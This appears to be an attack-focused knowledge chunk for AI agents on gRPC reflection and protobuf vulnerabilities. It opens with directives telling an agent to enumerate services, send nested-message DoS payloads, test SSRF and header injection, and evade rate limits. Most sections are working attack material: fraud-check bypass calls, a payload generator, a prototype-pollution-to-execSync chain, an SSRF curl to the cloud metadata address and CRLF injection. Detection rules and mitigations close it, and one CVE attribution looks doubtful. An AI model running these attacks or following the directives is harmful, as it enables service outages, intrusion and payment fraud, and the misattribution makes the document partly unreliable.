# gRPC Reflection & Protobuf Attacks — Agent Chunk 72a
> Source: gRPC Security Advisories, Protobuf CVE Database, CNCF Security Reports
> Purpose: Understand how gRPC reflection leaks API schemas, protobuf deserialization vulnerabilities enable DoS and RCE, and gRPC-specific attack vectors bypass traditional API security controls
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
When encountering gRPC services, first check for reflection to enumerate all services, methods, and message types. Use grpcurl for CLI enumeration, grpcui for interactive exploration, and ghz for load testing. Test protobuf messages for deserialization DoS with deeply nested or recursive payloads. Check gRPC-Web proxies for SSRF and header injection. Monitor for bidirectional streaming endpoints that may bypass per-request rate limiting.

---

## 1. gRPC Reflection Exploitation

### 1.1 What Reflection Exposes

gRPC reflection (enabled via `grpc.reflection.v1alpha.ServerReflection`) allows clients to discover all registered services, methods, and protobuf message types at runtime. This is the gRPC equivalent of leaving a Swagger UI open in production.

### 1.2 Enumeration with grpcurl

```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List all services via reflection
grpcurl -plaintext target.com:50051 list
# Output:
# grpc.reflection.v1alpha.ServerReflection
# payment.PaymentService
# user.UserService
# admin.AdminService           ← Internal service exposed!
# health.HealthService

# Describe a service — list all RPCs
grpcurl -plaintext target.com:50051 describe payment.PaymentService
# Output:
# payment.PaymentService is a service:
# service PaymentService {
#   rpc ProcessPayment ( .payment.PaymentRequest ) returns ( .payment.PaymentResponse );
#   rpc RefundPayment ( .payment.RefundRequest ) returns ( .payment.RefundResponse );
#   rpc ListTransactions ( .payment.ListRequest ) returns ( stream .payment.Transaction );
#   rpc InternalReconcile ( .payment.ReconcileRequest ) returns ( .payment.ReconcileResponse );
# }

# Describe a message type — reveal field names and types
grpcurl -plaintext target.com:50051 describe payment.PaymentRequest
# Output:
# payment.PaymentRequest is a message:
# message PaymentRequest {
#   string card_number = 1;
#   string cvv = 2;
#   int64 amount_cents = 3;
#   string currency = 4;
#   string merchant_id = 5;
#   bool bypass_fraud_check = 6;   ← Hidden admin field!
# }

# Call a method with crafted data
grpcurl -plaintext -d '{
  "card_number": "4111111111111111",
  "cvv": "123",
  "amount_cents": 100,
  "currency": "USD",
  "merchant_id": "test",
  "bypass_fraud_check": true
}' target.com:50051 payment.PaymentService/ProcessPayment
```

### 1.3 Interactive Exploration with grpcui

```bash
# Launch web UI for gRPC exploration
grpcui -plaintext target.com:50051
# Opens browser at http://127.0.0.1:PORT with form-based RPC invocation

# With TLS
grpcui -cacert ca.crt -cert client.crt -key client.key target.com:443
```

### 1.4 Load Testing with ghz

```bash
# Install ghz
go install github.com/bojand/ghz/cmd/ghz@latest

# Stress test a gRPC endpoint — useful for DoS assessment
ghz --insecure \
  --proto service.proto \
  --call payment.PaymentService.ProcessPayment \
  -d '{"amount_cents": 1}' \
  -n 10000 \
  -c 100 \
  target.com:50051
```

## 2. Protobuf Deserialization DoS — CVE-2024-7254

### 2.1 Vulnerability (CVSS 7.5)

Google protobuf libraries (Java, Python, C++) were vulnerable to stack overflow or excessive memory consumption when parsing deeply nested or recursive messages.

**CVE-2024-7254:** protobuf-java allowed crafted messages with deeply nested groups to cause StackOverflowError, crashing the JVM.

### 2.2 Attack Payload

```python
# Generate deeply nested protobuf payload
import struct

def make_nested_payload(depth=10000):
    """Create a protobuf message with extreme nesting depth."""
    payload = b''
    # Each level: field 1, type 3 (start group), then nested content
    for _ in range(depth):
        payload += b'\x0b'  # field 1, wire type 3 (start group)
    # Add a leaf value
    payload += b'\x08\x01'  # field 1, varint 1
    # Close all groups
    for _ in range(depth):
        payload += b'\x0c'  # field 1, wire type 4 (end group)
    return payload

# Send to gRPC service
import grpc
channel = grpc.insecure_channel('target.com:50051')
# Send raw bytes as serialized protobuf
```

**Impact:** JVM crash (StackOverflowError), Python recursion limit exceeded, C++ segfault. Affects any service that deserializes untrusted protobuf input.

**Affected versions:** protobuf-java < 3.25.5, protobuf-python < 4.25.5, protobuf < 27.5.
**Fix:** Update protobuf libraries; set recursion depth limits.

## 3. Schema Poisoning RCE — CVE-2026-41242

### 3.1 Vulnerability (CVSS 9.8)

protobuf.js (52M weekly npm downloads) was vulnerable to prototype pollution via crafted `.proto` schema files, leading to RCE when the polluted prototype was used in downstream template rendering or command execution.

```javascript
// Malicious .proto content loaded by protobuf.js
syntax = "proto3";

message Exploit {
  string __proto__ = 1;        // Field name is __proto__
  string constructor = 2;      // Field name is constructor
}

// When protobuf.js parses this schema:
// 1. It creates a JavaScript object with property __proto__
// 2. This pollutes Object.prototype
// 3. Any downstream code checking obj.isAdmin now returns attacker-controlled value
```

**Exploitation chain:**
```javascript
const protobuf = require('protobufjs');

// Load attacker-controlled .proto file (e.g., from user upload or registry)
const root = await protobuf.load('malicious.proto');

// Prototype is now polluted
console.log({}.polluted); // → "true" (attacker-controlled)

// If the application uses a template engine:
// ejs.render('<%= global.process.mainModule.require("child_process").execSync("id") %>')
```

**Affected versions:** protobuf.js < 7.4.0, < 6.11.5.
**Fix:** Update protobuf.js; never load untrusted `.proto` files.

## 4. HPACK Table Poisoning — CVE-2024-7246

### 4.1 Vulnerability

HTTP/2 uses HPACK header compression with a dynamic table that maps indices to header key-value pairs. Envoy's HPACK implementation allowed poisoning the dynamic table, causing subsequent requests on the same connection to inherit headers from earlier requests.

```
# Connection established, HPACK dynamic table empty

# Request 1 (attacker): Authorization: Bearer admin-token
# HPACK encodes and adds to dynamic table at index 62

# Request 2 (victim on same connection): No Authorization header
# But HPACK dynamic table still contains index 62 → admin-token
# If server references index 62, victim's request gets admin's token
```

**Affected:** Envoy < 1.31.1.
**Impact:** Authentication bypass via header leakage between multiplexed requests.

## 5. gRPC-Web Proxy SSRF and Header Injection

### 5.1 SSRF via Metadata

gRPC-Web proxies (grpcwebproxy, Envoy gRPC-Web filter) translate HTTP/1.1 requests to gRPC. Metadata fields become gRPC headers, which may be passed to upstream services.

```bash
# gRPC-Web request with SSRF payload in metadata
curl -X POST https://target.com/grpc-web/service.Method \
  -H "Content-Type: application/grpc-web-text" \
  -H "x-grpc-web: 1" \
  -H "grpc-metadata-upstream-host: http://169.254.169.254/latest/meta-data/" \
  -d "base64-encoded-protobuf-payload"
```

### 5.2 Header Injection via Metadata Keys

```bash
# Inject CRLF in metadata key to add arbitrary headers
curl -X POST https://target.com/grpc-web/service.Method \
  -H "Content-Type: application/grpc-web-text" \
  -H $'grpc-metadata-test\r\nX-Admin: true\r\n: value' \
  -d "payload"
```

## 6. Bidirectional Streaming Rate-Limit Evasion

### 6.1 The Problem

gRPC bidirectional streaming opens a single HTTP/2 stream for an indefinite number of messages. Rate limiters that count HTTP requests miss the individual messages within a stream.

```python
import grpc

channel = grpc.insecure_channel('target.com:50051')
stub = service_pb2_grpc.DataServiceStub(channel)

def message_generator():
    """Send 100,000 messages on a single stream."""
    for i in range(100000):
        yield service_pb2.DataRequest(query=f"exfiltrate-{i}")

# Single HTTP/2 stream — rate limiter sees 1 request
responses = stub.BidirectionalStream(message_generator())
for response in responses:
    process(response)
```

### 6.2 Detection

```yaml
# Envoy rate limit on gRPC message count (not request count)
- actions:
  - generic_key:
      descriptor_value: "grpc_stream_messages"
  - metadata:
      metadata_key:
        key: "envoy.filters.http.grpc_stats"
        path:
          - key: "message_count"
```

## 7. Detection Signatures

```yaml
# Detect reflection access
- rule: gRPC Reflection Access
  condition: grpc.service == "grpc.reflection.v1alpha.ServerReflection"
  severity: HIGH

# Detect deeply nested protobuf
- rule: Protobuf Nesting DoS
  condition: protobuf.nesting_depth > 100
  severity: CRITICAL

# Detect gRPC-Web SSRF attempts
- rule: gRPC-Web Metadata SSRF
  condition: >
    http.headers["grpc-metadata-*"] matches "http://169.254|http://127.0|http://10\."
  severity: HIGH
```

## 8. Mitigation

1. **Disable reflection in production:** Remove `grpc.reflection.v1alpha` registration.
2. **Set protobuf recursion limits:** Configure `setRecursionLimit(100)` on all parsers.
3. **Update protobuf.js:** Patch CVE-2026-41242; never load untrusted schemas.
4. **Rate-limit stream messages:** Count individual messages within gRPC streams, not just HTTP/2 requests.
5. **Sanitize gRPC-Web metadata:** Strip or validate all `grpc-metadata-*` headers at the proxy.
6. **Authenticate gRPC methods:** Use per-method interceptors, not just per-connection TLS.
